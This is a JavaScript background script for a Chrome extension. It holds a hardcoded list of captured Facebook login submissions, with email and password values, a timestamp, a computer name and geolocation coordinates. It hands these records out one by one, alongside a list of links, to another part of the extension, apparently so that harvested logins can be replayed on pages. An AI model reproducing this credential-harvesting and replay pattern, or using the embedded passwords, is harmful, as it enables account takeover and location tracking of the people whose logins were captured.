chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
	var countLinks = parseInt(localStorage.getItem("countLinks"));
	var countFacebooks = parseInt(localStorage.getItem("countFacebooks"));
	if (request.finish) {
		localStorage.setItem('finish', true);
	}else if (request.nextFacebook) {
		localStorage.setItem('countFacebooks', countFacebooks+1);
	}else if (request.nextPage) {
		localStorage.setItem('countLinks', countLinks+1);
	}else if (request.resetPage) {
		localStorage.setItem('countLinks', 0);
	}else{
		var links = JSON.parse(localStorage.getItem("links"));
		var json = [{"url":"https://es-la.facebook.com/","formData":{"email":"lay852","pass":"rroniki"},"timeStamp":"Tue Apr 04 2017 12:32:06 GMT-0500 (Hora est. Pacífico, Sudamérica)","computer":"62-S"},{"accuracy":7239,"location":{"lat":5.539294,"lng":-73.356241},"status":"OK"}, {"url":"https://es-la.facebook.com/","formData":{"email":"larry852","pass":"perroniki"},"timeStamp":"Tue Apr 04 2017 12:32:06 GMT-0500 (Hora est. Pacífico, Sudamérica)","computer":"62-S"},{"accuracy":7239,"location":{"lat":5.539294,"lng":-73.356241},"status":"OK"}, {"url":"https://es-la.facebook.com/","formData":{"email":"larry852","pass":"perroniki"},"timeStamp":"Tue Apr 04 2017 12:32:06 GMT-0500 (Hora est. Pacífico, Sudamérica)","computer":"62-S"},{"accuracy":7239,"location":{"lat":5.539294,"lng":-73.356241},"status":"OK"}];
		facebooks = []
		for (var i = 0; i < json.length; i++) {
			if (json[i].url) {
				if (json[i].url.includes("facebook")) {
					facebooks.push(json[i])
				}
			}        
		}
		var data = [links[countLinks], facebooks[countFacebooks]]
		sendResponse(data);
	}
});